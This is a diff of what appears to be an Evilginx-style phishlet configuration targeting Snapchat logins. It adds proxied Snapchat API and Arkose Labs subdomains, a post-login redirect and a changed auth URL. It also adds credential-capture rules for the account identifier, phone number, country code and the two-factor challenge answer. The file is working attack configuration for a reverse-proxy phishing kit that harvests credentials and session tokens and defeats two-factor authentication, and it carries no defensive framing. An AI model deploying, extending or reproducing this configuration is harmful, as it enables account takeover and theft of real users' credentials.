@@ -3,11 +3,35 @@
 
 author: '@an0nud4y'
 min_ver: '3.2.0'
+redirect_url: 'https://accounts.snapchat.com/v2/download-my-data'
+
+
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true}
   - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false}
   - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false}
+  - {phish_sub: 'us-central1-gcp', orig_sub: 'us-central1-gcp', domain: 'api.snapchat.com', session: true, is_landing: false}
+  - {phish_sub: 'gcp', orig_sub: 'gcp', domain: 'api.snapchat.com', session: true, is_landing: false}
+  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'api.snapchat.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'snapchat.com', session: false, is_landing: false}
+  - {phish_sub: 'snap-api', orig_sub: 'snap-api', domain: 'arkoselabs.com', session: true, is_landing: false}
+
+
+
+  # us-central1-gcp.api.snapchat.com
+  # gcp.api.snapchat.com
+  # aws.api.snapchat.com
+  # accounts.snapchat.com
+  # static.snapchat.com
+  # iframe.arkoselabs.com
+  # graphql.contentful.com
+  # story.snapchat.com
+  # snap-api.arkoselabs.com
+  # tr.snapchat.com
+  # sc-static.net
+
+  
 
 sub_filters:
   - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
@@ -45,7 +69,7 @@ auth_tokens:
 
 
 auth_urls:
-  - '/v2/welcome'  
+  - '/accounts/sso?client_id=snapchat-com-metrics'  
 
 
 
@@ -64,6 +88,18 @@ credentials:
     type: "post"
   custom:
     key: 'accountIdentifier'
+    search: "(.*)"
+    type: 'post'
+  custom:
+    key: 'twoFAChallengeAnswer'
+    search: "(.*)"
+    type: 'post'
+  custom:
+    key: 'accountIdentifierCountryCode'
+    search: "(.*)"
+    type: 'post'
+  custom:
+    key: 'accountIdentifierPhoneNumber'
     search: "(.*)"
     type: 'post'
 
